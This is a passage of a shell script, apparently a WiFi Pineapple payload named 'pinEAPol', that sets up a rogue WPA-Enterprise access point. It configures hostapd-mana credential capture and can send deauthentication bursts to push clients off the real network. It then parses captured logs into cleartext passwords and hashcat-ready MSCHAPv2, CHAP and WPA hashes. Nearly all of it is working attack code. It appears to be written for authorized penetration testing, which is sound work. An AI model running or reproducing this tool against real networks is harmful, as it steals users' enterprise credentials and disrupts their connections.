        fast-mschapv2) printf '%s' "FAST + MSCHAPv2 [hash]" ;;
        fast-gtc) printf '%s' "FAST + GTC [cleartext]" ;;
        md5) printf '%s' "EAP-MD5" ;;
        mschapv2) printf '%s' "EAP-MSCHAPv2 [hash]" ;;
        gtc) printf '%s' "EAP-GTC [cleartext]" ;;
        *) printf '%s' "Invalid EAP profile" ;;
    esac
}

select_eap_profile() {
    local selected default_label inner_selected
    local help_option="Help choosing a profile"
    local back_option="Back"
    local options=(
        "Broad / automatic"
        "PEAP"
        "TTLS"
        "FAST"
        "EAP-TLS"
        "EAP-MD5"
        "EAP-MSCHAPv2"
        "EAP-GTC"
        "$help_option"
    )
    default_label=$(eap_profile_label "$EAP_PROFILE")

    while true; do
        selected=$(ui_list_picker "EAP Profile" "$default_label" "${options[@]}") || return 1
        case "$selected" in
            "$help_option")
                PROMPT "EAP PROFILE HELP

Broad: lets the client negotiate.
Select PEAP, TTLS, or FAST to choose a compatible inner method next.
PEAP: MSCHAPv2, GTC, or MD5.
TTLS: EAP-MD5, EAP-GTC, EAP-MSCHAPv2, MSCHAPv2, MSCHAPv1, PAP, or CHAP.
FAST: MSCHAPv2 or GTC; collectable output depends on the client and MANA build.
EAP-TLS has no password exchange; it can optionally accept a presented client
certificate for an explicitly authorized client-certificate test.
Direct EAP-MD5, EAP-MSCHAPv2, and EAP-GTC have no inner method.
Choose Back from an inner-method list to return here without changing the profile.

Press OK to return."
                ;;
            "PEAP")
                inner_selected=$(ui_list_picker "PEAP Inner Method" "MSCHAPv2 [hash]" \
                    "MSCHAPv2 [hash]" "GTC [cleartext]" "MD5 [hash]" "$back_option") || return 1
                case "$inner_selected" in
                    "MSCHAPv2 [hash]") EAP_PROFILE="peap-mschapv2" ;;
                    "GTC [cleartext]") EAP_PROFILE="peap-gtc" ;;
                    "MD5 [hash]") EAP_PROFILE="peap-md5" ;;
                    "$back_option") continue ;;
                esac
                break
                ;;
            "TTLS")
                inner_selected=$(ui_list_picker "TTLS Inner Method" "MSCHAPv2 [hash]" \
                    "EAP-MD5 [hash]" "EAP-GTC [cleartext]" "EAP-MSCHAPv2 [hash]" \
                    "MSCHAPv2 [hash]" "MSCHAPv1 [hash]" "PAP [cleartext]" "CHAP [hash]" \
                    "$back_option") || return 1
                case "$inner_selected" in
                    "EAP-MD5 [hash]") EAP_PROFILE="ttls-eap-md5" ;;
                    "EAP-GTC [cleartext]") EAP_PROFILE="ttls-eap-gtc" ;;
                    "EAP-MSCHAPv2 [hash]") EAP_PROFILE="ttls-eap-mschapv2" ;;
                    "MSCHAPv2 [hash]") EAP_PROFILE="ttls-mschapv2" ;;
                    "MSCHAPv1 [hash]") EAP_PROFILE="ttls-mschap" ;;
                    "PAP [cleartext]") EAP_PROFILE="ttls-pap" ;;
                    "CHAP [hash]") EAP_PROFILE="ttls-chap" ;;
                    "$back_option") continue ;;
                esac
                break
                ;;
            "FAST")
                inner_selected=$(ui_list_picker "FAST Inner Method" "MSCHAPv2 [hash]" \
                    "MSCHAPv2 [hash]" "GTC [cleartext]" "$back_option") || return 1
                case "$inner_selected" in
                    "MSCHAPv2 [hash]") EAP_PROFILE="fast-mschapv2" ;;
                    "GTC [cleartext]") EAP_PROFILE="fast-gtc" ;;
                    "$back_option") continue ;;
                esac
                break
                ;;
            "EAP-TLS")
                inner_selected=$(ui_list_picker "EAP-TLS Mode" "Verify client certificate" \
                    "Verify client certificate" "Accept presented client certificate" "$back_option") || return 1
                case "$inner_selected" in
                    "Verify client certificate") EAP_PROFILE="eap-tls" ;;
                    "Accept presented client certificate") EAP_PROFILE="eap-tls-accept-any" ;;
                    "$back_option") continue ;;
                esac
                break
                ;;
            "EAP-MD5") EAP_PROFILE="md5"; break ;;
            "EAP-MSCHAPv2") EAP_PROFILE="mschapv2"; break ;;
            "EAP-GTC") EAP_PROFILE="gtc"; break ;;
            "Broad / automatic") EAP_PROFILE="broad"; break ;;
        esac
    done

    write_persistent_settings
    logboth blue "Selected EAP profile: $EAP_PROFILE"
    return 0
}

write_hostapd_config() {
    local ssid="$1"
    local channel="$2"
    local mana_eaptls=0
    local fast_pac_key=""

    logboth "Configuring hostapd for SSID: '$ssid'"

    if [ -z "$ssid" ]; then
        logboth red "Error: SSID is empty"
        return 1
    fi

    case "$ssid" in
        *$'\n'*|*$'\r'*)
            logboth red "Error: SSID contains a line break"
            return 1
            ;;
    esac
    if [ ${#ssid} -gt 32 ]; then
        logboth red "Error: SSID exceeds 32 characters"
        return 1
    fi

    # Determine hw_mode based on channel
    local hw_mode="$DEFAULT_HW_MODE"
    if [ "$channel" -gt 14 ] 2>/dev/null; then
        hw_mode="a"
    fi

    case "$EAP_PROFILE" in
        eap-tls-accept-any)
            mana_eaptls=1
            ;;
    esac

    case "$EAP_PROFILE" in
        broad|fast-mschapv2|fast-gtc)
            ensure_fast_pac_key || return 1
            IFS= read -r fast_pac_key < "$FAST_PAC_KEY_FILE" || true
            ;;
    esac

    cat > "$HOSTAPD_CONF" << HOSTAPDEOF
# pinEAPol hostapd-mana configuration
interface=$PINEAPOL_IFACE
driver=nl80211
ssid=$ssid
channel=$channel
hw_mode=$hw_mode

# WPA-Enterprise Settings
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee8021x=1
auth_algs=1

# Built-in EAP server
eap_server=1
eap_user_file=$EAP_USER_FILE
fragment_size=1260

# TLS & Certificates
ca_cert=$CERT_DIR/ca.pem
server_cert=$CERT_DIR/server.pem
private_key=$CERT_DIR/server.key

# Logging
logger_syslog=-1
logger_syslog_level=0
logger_stdout=-1
logger_stdout_level=0
ctrl_interface=$HOSTAPD_CTRL_DIR
ctrl_interface_group=0

# MANA WPE capture. Karma and forced success remain disabled. Accepting an
# arbitrary EAP-TLS client certificate is enabled only by its explicit profile.
mana_wpe=1
mana_credout=$MANA_CREDOUT
enable_mana=0
mana_loud=0
mana_eapsuccess=0
mana_eaptls=$mana_eaptls

# Operational Tweaks
ap_isolate=0
ignore_broadcast_ssid=0
wme_enabled=1
ieee80211n=0
HOSTAPDEOF

    case "$EAP_PROFILE" in
        broad|fast-mschapv2|fast-gtc)
            cat >> "$HOSTAPD_CONF" << 'HOSTAPDFASTEOF'

# EAP-FAST Provisioning
HOSTAPDFASTEOF
            printf 'pac_opaque_encr_key=%s\n' "$fast_pac_key" >> "$HOSTAPD_CONF"
            cat >> "$HOSTAPD_CONF" << 'HOSTAPDFASTEOF'
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_fast_a_id_info=hostapd
eap_fast_prov=3
HOSTAPDFASTEOF
            ;;
    esac

    if [ -f "$HOSTAPD_CONF" ]; then
        logboth green "hostapd config written"
        return 0
    else
        logboth red "hostapd config failed"
        return 1
    fi
}

# ============================================
# PHASE 3: DEPLOY
# ============================================

start_hostapd() {
    logboth blue "Starting rogue AP..."
    local sid=$(START_SPINNER "Starting hostapd...")

    # Ensure interface is down before hostapd starts
    ifconfig "$PINEAPOL_IFACE" down 2>/dev/null
    sleep 1

    # MANA appends structured credentials to this per-session file.
    : > "$MANA_CREDOUT"
    chmod 600 "$MANA_CREDOUT" 2>/dev/null

    # Start hostapd-mana with max debug logging.
    "$HOSTAPD_BIN" -ddd -K "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
    HOSTAPD_PID=$!
    if ! record_hostapd_state "$HOSTAPD_PID" "$HOSTAPD_CONF"; then
        kill "$HOSTAPD_PID" 2>/dev/null
        logboth red "Could not persist hostapd runtime ownership"
        return 1
    fi
    start_runtime_watchdog || {
        stop_managed_hostapd
        logboth red "Could not start runtime watchdog"
        return 1
    }

    # Wait for startup
    sleep 3

    STOP_SPINNER $sid

    # Verify running
    if ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
        record_radio_diagnostics
        clear_hostapd_state
        logboth red "hostapd failed to start"
        if grep -q 'Resource busy' "$HOSTAPD_LOG" 2>/dev/null; then
            logboth yellow "Radio is busy; diagnostics: $SESSION_LOG_DIR/radio-state.log"
        fi
        if [ -f "$HOSTAPD_LOG" ]; then
            tail -n 5 "$HOSTAPD_LOG" 2>/dev/null | while IFS= read -r line; do
                LOG red "  $line"
            done
        fi
        if [ "$HOSTAPD_BIN" = "$HOSTAPD_CACHE_DIR/current/hostapd" ] && \
           [ -x "$HOSTAPD_CACHE_DIR/previous/hostapd" ]; then
            logboth yellow "Retrying previous cached hostapd"
            local failed_target previous_target
            failed_target=$(readlink -f "$HOSTAPD_CACHE_DIR/current" 2>/dev/null)
            previous_target=$(readlink -f "$HOSTAPD_CACHE_DIR/previous" 2>/dev/null)
            mv "$HOSTAPD_LOG" "$SESSION_LOG_DIR/hostapd-current-failed.log" 2>/dev/null
            HOSTAPD_BIN="$HOSTAPD_CACHE_DIR/previous/hostapd"
            "$HOSTAPD_BIN" -ddd -K "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
            HOSTAPD_PID=$!
            if ! record_hostapd_state "$HOSTAPD_PID" "$HOSTAPD_CONF"; then
                kill "$HOSTAPD_PID" 2>/dev/null
                return 1
            fi
            sleep 3
            if kill -0 "$HOSTAPD_PID" 2>/dev/null; then
                logboth green "Previous cached hostapd started successfully"
                [ -n "$failed_target" ] && ln -sfn "$failed_target" "$HOSTAPD_CACHE_DIR/failed"
                if [ -n "$previous_target" ]; then
                    ln -sfn "$previous_target" "$HOSTAPD_CACHE_DIR/current"
                    cp "$previous_target/manifest" "$HOSTAPD_CACHE_DIR/current.manifest" 2>/dev/null
                    HOSTAPD_BIN="$HOSTAPD_CACHE_DIR/current/hostapd"
                fi
            else
                clear_hostapd_state
                return 1
            fi
        else
            return 1
        fi
    fi

    if grep -q 'AP-ENABLED' "$HOSTAPD_LOG" 2>/dev/null; then
        logboth green "hostapd EAP server started (eap_server=1)"
    else
        logboth yellow "hostapd is running; AP-ENABLED not yet present"
    fi

    if grep -Ei 'unknown EAP type|not supported|failed to parse|invalid EAP|failed to read.*eap_user' "$HOSTAPD_LOG" >/dev/null 2>&1; then
        logboth red "Selected hostapd rejected the $EAP_PROFILE profile"
        return 1
    fi

    if ! grep -q 'MANA: WPE EAP mode enabled' "$HOSTAPD_LOG" 2>/dev/null; then
        logboth red "hostapd-mana did not enable WPE credential capture"
        return 1
    fi

    logboth green "MANA WPE credential capture enabled"
    logboth green "EAP profile accepted: $EAP_PROFILE"
    logboth green "Rogue AP online: $TARGET_SSID"
    return 0
}

start_capture() {
    if ! command -v tcpdump >/dev/null 2>&1; then
        logboth yellow "tcpdump unavailable, skipping raw capture"
        return 0
    fi

    : > "$TCPDUMP_LOG"
    local packet_buffered=""
    if tcpdump --help 2>&1 | grep -q -- '-U'; then
        packet_buffered="-U"
    fi

    tcpdump $packet_buffered -i "$PINEAPOL_IFACE" -w "$TCPDUMP_PCAP" -s 0 \
        'ether proto 0x888e' \
        > /dev/null 2> "$TCPDUMP_LOG" &
    TCPDUMP_PID=$!
    if ! record_capture_state "$TCPDUMP_PID"; then
        kill "$TCPDUMP_PID" 2>/dev/null
        TCPDUMP_PID=""
        logboth yellow "Could not persist tcpdump runtime ownership"
        return 0
    fi

    sleep 1
    if ! kill -0 "$TCPDUMP_PID" 2>/dev/null; then
        wait "$TCPDUMP_PID" 2>/dev/null || true
        TCPDUMP_PID=""
        clear_capture_state
        logboth yellow "tcpdump failed to start; see $TCPDUMP_LOG"
        return 0
    fi

    logboth green "Packet capture started"
    return 0
}

configure_deauth_runtime() {
    if [ -z "$TARGET_BSSID" ]; then
        DEAUTH_ENABLED=0
        logboth yellow "No target BSSID - skipping deauth"
        return 0
    fi

    local choice default_choice burst_count
    default_choice="Skip deauthentication"
    [ "$DEAUTH_ENABLED" -eq 1 ] && default_choice="Send deauthentication burst"
    choice=$(ui_list_picker "Client Reconnection" "$default_choice" \
        "Skip deauthentication" "Send deauthentication burst") || return 1

    if [ "$choice" = "Skip deauthentication" ]; then
        DEAUTH_ENABLED=0
        logboth "Skipping deauth"
        return 0
    fi

    burst_count=$(NUMBER_PICKER "Deauth packets" "$DEAUTH_BURST_COUNT") || return 1
    case "$burst_count" in ''|*[!0-9]*) return 1 ;; esac
    [ "$burst_count" -gt 0 ] 2>/dev/null || return 1
    DEAUTH_ENABLED=1
    DEAUTH_BURST_COUNT="$burst_count"
    return 0
}

deauth_target_clients() {
    [ "$DEAUTH_ENABLED" -eq 1 ] || return 0
    [ -n "$TARGET_BSSID" ] || return 0

    logboth yellow "Sending $DEAUTH_BURST_COUNT deauths..."

    local i=0
    while [ $i -lt "$DEAUTH_BURST_COUNT" ]; do
        PINEAPPLE_DEAUTH_CLIENT "$TARGET_BSSID" "FF:FF:FF:FF:FF:FF" "$TARGET_CHANNEL"
        i=$((i + 1))
        sleep 0.1
    done

    logboth green "Deauth burst complete ($DEAUTH_BURST_COUNT packets)"
    VIBRATE
    return 0
}

review_deployment() {
    local action deauth_summary
    while true; do
        if [ "$DEAUTH_ENABLED" -eq 1 ]; then
            deauth_summary="$DEAUTH_BURST_COUNT packets"
        else
            deauth_summary="disabled"
        fi

        PROMPT "pinEAPol CONFIGURATION

SSID: $TARGET_SSID
Channel: $TARGET_CHANNEL
EAP: $(eap_profile_label "$EAP_PROFILE")
Certificate: $CERT_PROFILE
Server CN: $CERT_CN
Deauth: $deauth_summary

Press OK to choose an action."

        action=$(ui_list_picker "Review Setup" "Deploy" \
            "Deploy" "Change EAP profile" "Change certificate" "Change deauth" "Cancel") || return 1
        case "$action" in
            "Deploy") return 0 ;;
            "Change EAP profile") select_eap_profile || return 1 ;;
            "Change certificate") configure_certificate_runtime || return 1 ;;
            "Change deauth") configure_deauth_runtime || return 1 ;;
            "Cancel") return 1 ;;
        esac
    done
}

# ============================================
# CREDENTIAL PARSING
# ============================================

# Emit identities present in common hostapd -dd formats. The awk section also
# handles the printable column of EAP Identity hexdump_ascii output. A bare
# EAP Response-Identity marker is deliberately not treated as an identity.
extract_eap_identities() {
    local log_file="$1"

    {
        sed -n "s/.*identity='\([^']*\)'.*/\1/p" "$log_file"
        sed -n 's/.*identity="\([^"]*\)".*/\1/p' "$log_file"
        sed -n "s/.*Identity: '\([^']*\)'.*/\1/p" "$log_file"
        sed -n "s/.*EAP-[Rr]esponse\/Identity '\([^']*\)'.*/\1/p" "$log_file"
        sed -n 's/.*MANA EAP Identity Phase [01]:[[:space:]]*//p' "$log_file"
        awk '
            function emit_dump() {
                if (dump_text != "") print dump_text
                dump_text = ""
            }
            /EAP-[Rr]esponse\/Identity.*hexdump_ascii/ ||
            /EAP-Identity: Peer identity.*hexdump_ascii/ ||
            /[Pp]hase 2.*[Ii]dentity.*hexdump_ascii/ {
                emit_dump()
                in_dump = 1
                next
            }
            in_dump {
                text = $0
                sub(/^[[:space:]]*/, "", text)
                if (text !~ /^[0-9A-Fa-f][0-9A-Fa-f][[:space:]]/) {
                    emit_dump()
                    in_dump = 0
                    next
                }
                while (text ~ /^[0-9A-Fa-f][0-9A-Fa-f][[:space:]]+/)
                    sub(/^[0-9A-Fa-f][0-9A-Fa-f][[:space:]]+/, "", text)
                sub(/^[[:space:]]+/, "", text)
                sub(/[[:space:]]+$/, "", text)
                dump_text = dump_text text
                next
            }
            END { emit_dump() }
        ' "$log_file"
    } | sed '/^$/d'
}

extract_contextual_cleartext() {
    local log_file="$1"
    awk '
        /EAP-GTC|[Gg][Tt][Cc]/ { method = "GTC"; ttl = 8 }
        /TTLS\/PAP|TTLS-PAP|[Pp][Aa][Pp].*[Pp]assword/ { method = "PAP"; ttl = 8 }
        {
            if (ttl > 0) ttl--
            if (ttl == 0) method = ""
        }
        method == "GTC" && /Response='\''[^'\'']*'\''/ {
            value = $0
            sub(/.*Response='\''/, "", value)
            sub(/'\''.*/, "", value)
            if (value != "") print method "\t" value
        }
        method == "PAP" && /Password='\''[^'\'']*'\''/ {
            value = $0
            sub(/.*Password='\''/, "", value)
            sub(/'\''.*/, "", value)
            if (value != "") print method "\t" value
        }
        method == "PAP" && /password="[^"]*"/ {
            value = $0
            sub(/.*password="/, "", value)
            sub(/".*/, "", value)
            if (value != "") print method "\t" value
        }
    ' "$log_file"
}

extract_mana_hashcat_5500() {
    local cred_file="$1"
    [ -f "$cred_file" ] || return 0

    awk -F '\t' '
        NF >= 2 && $1 ~ /^\[[^]]+ HASHCAT\]$/ && $1 !~ /user=/ {
            record = $2
            marker = index(record, "::::")
            if (!marker) next
            user = substr(record, 1, marker - 1)
            remainder = substr(record, marker + 4)
            separator = index(remainder, ":")
            if (!separator) next
            response = substr(remainder, 1, separator - 1)
            challenge = substr(remainder, separator + 1)
            if (user != "" && length(response) == 48 &&
                length(challenge) == 16 &&
                response ~ /^[0-9A-Fa-f]+$/ &&
                challenge ~ /^[0-9A-Fa-f]+$/)
                print user "::::" tolower(response) ":" tolower(challenge)
        }
    ' "$cred_file"
}

# hostapd-mana writes the same validated Hashcat record to stdout immediately,
# while mana_credout may remain stdio-buffered until hostapd exits. This parser
# is intentionally narrow so live monitoring never mistakes a debug hexdump for
# a credential record.
extract_mana_hashcat_hostapd() {
    local log_file="$1"
    [ -f "$log_file" ] || return 0

    awk '
        index($0, "MANA EAP ") && index($0, " HASHCAT | ") {
            marker = index($0, " HASHCAT | ")
            record = substr($0, marker + 11)
            split_at = index(record, "::::")
            if (!split_at) next
            user = substr(record, 1, split_at - 1)
            remainder = substr(record, split_at + 4)
            separator = index(remainder, ":")
            if (!separator) next
            response = substr(remainder, 1, separator - 1)
            challenge = substr(remainder, separator + 1)
            if (user != "" && length(response) == 48 &&
                length(challenge) == 16 &&
                response ~ /^[0-9A-Fa-f]+$/ &&
                challenge ~ /^[0-9A-Fa-f]+$/)
                print user "::::" tolower(response) ":" tolower(challenge)
        }
    ' "$log_file"
}

# A completed WPA-EAP connection can also make hostapd-mana emit a native
# Hashcat 22000 WPA record. It is separate from the EAP credential writers and
# is available only on hostapd stdout, so preserve it when present rather than
# leaving a crack-ready hash stranded in the debug log.
extract_mana_hashcat_22000_hostapd() {
    local log_file="$1"
    [ -f "$log_file" ] || return 0

    awk '
        index($0, "MANA WPA2 HASHCAT | ") {
            record = $0
            sub(/.*MANA WPA2 HASHCAT \| /, "", record)
            count = split(record, fields, "\\*")
            if (count < 9 || fields[1] != "WPA" || fields[2] !~ /^0[12]$/) next
            if (length(fields[3]) != 32 || length(fields[4]) != 12 ||
                length(fields[5]) != 12 || length(fields[9]) != 2 ||
                fields[3] !~ /^[0-9A-Fa-f]+$/ ||
                fields[4] !~ /^[0-9A-Fa-f]+$/ ||
                fields[5] !~ /^[0-9A-Fa-f]+$/ ||
                fields[6] !~ /^[0-9A-Fa-f]+$/ ||
                fields[7] !~ /^[0-9A-Fa-f]+$/ ||
                fields[8] !~ /^[0-9A-Fa-f]+$/ ||
                fields[9] !~ /^[0-9A-Fa-f]+$/) next
            print record
        }
    ' "$log_file"
}

extract_mana_cleartext() {
    local cred_file="$1"
    [ -f "$cred_file" ] || return 0

    awk -F '\t' '
        NF >= 2 && $1 ~ /^\[[^]]+\]$/ &&
        $1 !~ /(ASLEAP|JTR|HASHCAT)/ {
            source = substr($1, 2, length($1) - 2)
            record = substr($0, index($0, "\t") + 1)
            separator = index(record, ":")
            if (!separator) next
            user = substr(record, 1, separator - 1)
            password = substr(record, separator + 1)
            if (user != "" && password != "")
                print source "\t" user "\t" password
        }
    ' "$cred_file"
}

# The WPE plaintext format is also emitted to hostapd stdout immediately:
# "MANA EAP <method> | <username>:<value>". Restrict this to GTC and PAP so
# unrelated debug values are never misclassified as authentication data.
extract_mana_cleartext_hostapd() {
    local log_file="$1"
    [ -f "$log_file" ] || return 0

    awk '
        index($0, "MANA EAP ") && index($0, " | ") &&
        $0 !~ /(ASLEAP|JTR|HASHCAT)/ {
            line = $0
            sub(/.*MANA EAP /, "", line)
            marker = index(line, " | ")
            if (!marker) next
            source = substr(line, 1, marker - 1)
            if (source !~ /(GTC|PAP)/) next
            record = substr(line, marker + 3)
            separator = index(record, ":")
            if (!separator) next
            user = substr(record, 1, separator - 1)
            password = substr(record, separator + 1)
            if (user != "" && password != "")
                print source "\t" user "\t" password
        }
    ' "$log_file"
}

# EAP-TLS does not expose a password. Preserve certificate-related diagnostics
# separately when hostapd/OpenSSL emits them, without claiming that every TLS
# diagnostic denotes a presented client certificate. The raw debug log and PCAP
# remain the authoritative record of the complete TLS exchange.
extract_tls_evidence() {
    local log_file="$1"
    [ -f "$log_file" ] || return 0

    grep -Ei \
        'EAP-TLS|TLS:.*(peer|client|certificate|cert|subject|issuer|serial|fingerprint)|((peer|client)[[:space:]-]*certificate|certificate[[:space:]-]*(subject|issuer|serial|fingerprint))' \
        "$log_file" 2>/dev/null | sed '/^$/d'
}

extract_mana_chap() {
    local cred_file="$1"
    [ -f "$cred_file" ] || return 0

    awk -F '\t' '
        NF >= 2 && $1 ~ /^\[[^]]+ HASHCAT user=[^]]+\]$/ {
            tag = substr($1, 2, length($1) - 2)
            source = tag
            sub(/ HASHCAT user=.*/, "", source)
            user = tag
            sub(/.* HASHCAT user=/, "", user)
            split($2, fields, ":")
            if (user != "" && length(fields[1]) == 32 &&
                length(fields[2]) == 32 && length(fields[3]) == 2)
                print source "\t" user "\t" tolower(fields[1]) "\t" \
                    tolower(fields[2]) "\t" tolower(fields[3])
        }
    ' "$cred_file"
}

# MANA emits the same legacy challenge-response record to hostapd's immediate
# stdout before its credential file necessarily flushes. This covers MD5 and
# TTLS-CHAP/MSCHAP records during live monitoring and interrupted sessions.
extract_mana_chap_hostapd() {
    local log_file="$1"
    [ -f "$log_file" ] || return 0

    awk '
        /MANA EAP .* HASHCAT user=.* \| / {
            line = $0
            sub(/.*MANA EAP /, "", line)
            if (split(line, parts, " HASHCAT user=") != 2) next
            source = parts[1]
            if (split(parts[2], parts, " \\| ") != 2) next
            user = parts[1]
            split(parts[2], fields, ":")
            if (user != "" && length(fields[1]) == 32 &&
                length(fields[2]) == 32 && length(fields[3]) == 2 &&
                fields[1] ~ /^[0-9A-Fa-f]+$/ &&
                fields[2] ~ /^[0-9A-Fa-f]+$/ &&
                fields[3] ~ /^[0-9A-Fa-f]+$/)
                print source "\t" user "\t" tolower(fields[1]) "\t" \
                    tolower(fields[2]) "\t" tolower(fields[3])
        }
    ' "$log_file"
}

extract_mana_identities() {
    local cred_file="$1"
    [ -f "$cred_file" ] || return 0

    {
        extract_mana_hashcat_5500 "$cred_file" | sed 's/::::.*//'
        extract_mana_cleartext "$cred_file" | cut -f 2
        extract_mana_chap "$cred_file" | cut -f 2
    } | sed '/^$/d'
}

parse_eap_sessions() {
    local log_file="$1"
    local output_file="$2"

    awk '
        BEGIN {
            OFS = "\t"
            print "source_line", "station", "session", "outer_identity", "inner_identity", "outer_method", "inner_method", "result", "event"
        }
        function clean_mac(value) {
            gsub(/^[^0-9A-Fa-f]*/, "", value)
            gsub(/[^0-9A-Fa-f:].*$/, "", value)
            return tolower(value)
        }
        function find_mac(    i, candidate) {
            for (i = 1; i <= NF; i++) {
                candidate = clean_mac($i)
                if (candidate ~ /^[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]$/)
                    return candidate
            }
            return ""
        }
        function emit(event, result,    key) {
            if (sta == "") sta = "unknown"
            key = sta SUBSEP sessions[sta] SUBSEP event SUBSEP outer_id[sta] SUBSEP inner_id[sta] SUBSEP outer[sta] SUBSEP inner[sta] SUBSEP result
            if (!seen[key]++)
                print NR, sta, sessions[sta], outer_id[sta], inner_id[sta], outer[sta], inner[sta], result, event
        }
        {
            found = find_mac()
            if (found != "") sta = found

            if (/CTRL-EVENT-EAP-STARTED|start authentication/) {
                if (sta == "") sta = "unknown"
                sessions[sta]++
                outer_id[sta] = inner_id[sta] = outer[sta] = inner[sta] = ""
                emit("eap-started", "")
            }

            if (/[Pp]hase 2.*[Ii]dentity: '\''[^'\'']*'\''/) {
                value = $0
                sub(/.*[Ii]dentity: '\''/, "", value)
                sub(/'\''.*/, "", value)
                inner_id[sta] = value
                emit("inner-identity", "")
            } else if (/identity='\''[^'\'']*'\''/) {
                value = $0
                sub(/.*identity='\''/, "", value)
                sub(/'\''.*/, "", value)
                if (inner[sta] != "") inner_id[sta] = value; else outer_id[sta] = value
                emit("identity", "")
            } else if (/EAP-[Rr]esponse\/Identity '\''[^'\'']*'\''/) {
                value = $0
                sub(/.*EAP-[Rr]esponse\/Identity '\''/, "", value)
                sub(/'\''.*/, "", value)
                if (inner[sta] != "") inner_id[sta] = value; else outer_id[sta] = value
                emit("identity", "")
            }

            if (/EAP Response-PEAP|EAP-PEAP/) { outer[sta] = "PEAP"; emit("outer-method", "") }
            else if (/EAP Response-TTLS|EAP-TTLS/) { outer[sta] = "TTLS"; emit("outer-method", "") }
            else if (/EAP Response-FAST|EAP-FAST/) { outer[sta] = "FAST"; emit("outer-method", "") }
            else if (/EAP Response-TLS|EAP-TLS/) { outer[sta] = "TLS"; emit("outer-method", "") }
            else if (/EAP Response-MD5/ || (outer[sta] == "" && /EAP-MD5/)) { outer[sta] = "MD5"; emit("outer-method", "") }
            else if (outer[sta] == "" && /EAP-MSCHAPV2|MSCHAPV2/) { outer[sta] = "MSCHAPV2"; emit("outer-method", "") }
            else if (outer[sta] == "" && /EAP-GTC|[^A-Za-z]GTC[^A-Za-z]/) { outer[sta] = "GTC"; emit("outer-method", "") }

            if (outer[sta] != "MSCHAPV2" && /EAP-MSCHAPV2|MSCHAPV2/) { inner[sta] = "MSCHAPV2"; emit("inner-method", "") }
            else if (/TTLS-MSCHAP([^V]|$)|TTLS\/MSCHAP([^V]|$)/) { inner[sta] = "MSCHAPV1"; emit("inner-method", "") }
            else if (/TTLS-CHAP|TTLS\/CHAP/) { inner[sta] = "CHAP"; emit("inner-method", "") }
            else if (outer[sta] != "MD5" && /EAP-MD5/) { inner[sta] = "MD5"; emit("inner-method", "") }
            else if (outer[sta] != "GTC" && /EAP-GTC|[^A-Za-z]GTC[^A-Za-z]/) { inner[sta] = "GTC"; emit("inner-method", "") }
            else if (/TTLS\/PAP|TTLS-PAP/) { inner[sta] = "PAP"; emit("inner-method", "") }

            if (/CTRL-EVENT-EAP-SUCCESS/) emit("authentication-result", "success")
            if (/CTRL-EVENT-EAP-FAILURE/) emit("authentication-result", "failure")
            if (/Supplicant used different EAP type/) emit("method-mismatch", "failure")
            if (/(^|[^A-Za-z])NAK([^A-Za-z]|$)/) emit("nak", "failure")
        }
    ' "$log_file" > "$output_file"
}

hex_to_binary() {
    local hex="$1"
    local byte
    while [ -n "$hex" ]; do
        byte=${hex%"${hex#??}"}
        hex=${hex#??}
        printf '%b' "\\x$byte"
    done
}

derive_mschapv2_challenge() {
    local peer_challenge="$1"
    local auth_challenge="$2"
    local username="$3"

    {
        hex_to_binary "$peer_challenge"
        hex_to_binary "$auth_challenge"
        printf '%s' "$username"
    } | openssl dgst -sha1 -binary 2>/dev/null | \
        hexdump -v -e '1/1 "%02x"' 2>/dev/null | cut -c 1-16
}

compact_hex_payload() {
    local value="$1"
    case "$value" in
        *'= '*) value=${value##*= } ;;
        *': '*) value=${value##*: } ;;
    esac
    printf '%s' "$value" | tr -cd '0-9A-Fa-f'
}

# Decode only the leading byte tokens from a hostapd hexdump line. Using tr on
# the complete hexdump_ascii line also consumes hexadecimal-looking characters
# from its printable column (for example the "da" in "data").
hexdump_byte_payload() {
    local value="$1"
    local limit="${2:-0}"
    printf '%s\n' "$value" | awk -v limit="$limit" '
        {
            output = ""
            count = 0
            for (i = 1; i <= NF; i++) {
                if ($i !~ /^[0-9A-Fa-f][0-9A-Fa-f]$/) {
                    if (count > 0) break
                    continue
                }
                if (limit > 0 && count >= limit) break
                output = output $i
                count++
            }
            print output
        }
    '
}

publish_unique_lines_atomic() {
    local destination="$1"
    local lines="$2"
    local candidate="${destination}.new.$$"

    printf '%s\n' "$lines" | sed '/^$/d' | sort -u > "$candidate" || return 1
    chmod 600 "$candidate" 2>/dev/null
    mv "$candidate" "$destination"
}

publish_mana_chap_records_atomic() {
    local destination="$1"
    local records="$2"
    local candidate="${destination}.new.$$"

    {
        printf 'method\tusername\thash\tsalt\tid\n'
        printf '%s\n' "$records" | sed '/^$/d' | sort -u
    } > "$candidate" || return 1
    chmod 600 "$candidate" 2>/dev/null
    mv "$candidate" "$destination"
}

publish_tabular_records_atomic() {
    local destination="$1"
    local header="$2"
    local records="$3"
    local candidate="${destination}.new.$$"

    {
        printf '%s\n' "$header"
        printf '%s\n' "$records" | sed '/^$/d' | sort -u
    } > "$candidate" || return 1
    chmod 600 "$candidate" 2>/dev/null
    mv "$candidate" "$destination"
}

# Hashcat mode 4800 (iSCSI CHAP authentication) accepts the same
# response:challenge:identifier representation emitted by MANA for EAP-MD5
# and TTLS-CHAP. The raw MANA credential log retains method and username context.
chap_records_to_hashcat_4800() {
    awk -F '\t' '
        $1 !~ /MSCHAP/ && $1 ~ /(MD5|CHAP)/ &&
        length($3) == 32 && length($4) == 32 && length($5) == 2 {
            print $3 ":" $4 ":" $5
        }
    '
}

format_cleartext_records() {
    awk -F '\t' 'NF >= 2 && $1 != "" && $2 != "" { print "[" $1 "] " $2 }'
}

cleanup_stale_parse_staging() {
    local staging_root="$1"
    local candidate pid

    [ -d "$staging_root" ] || return 0
    for candidate in "$staging_root"/.parse.*; do
        [ -d "$candidate" ] || continue
        pid=${candidate##*.parse.}
        case "$pid" in
            *[!0-9]*|'') continue ;;
        esac
        # Never touch a staging directory that could still belong to a live
        # parser. PID reuse can leave a stale directory behind temporarily,
        # which is safer than deleting an active parser's work.
        kill -0 "$pid" 2>/dev/null && continue
        rm -rf -- "$candidate"
    done
}

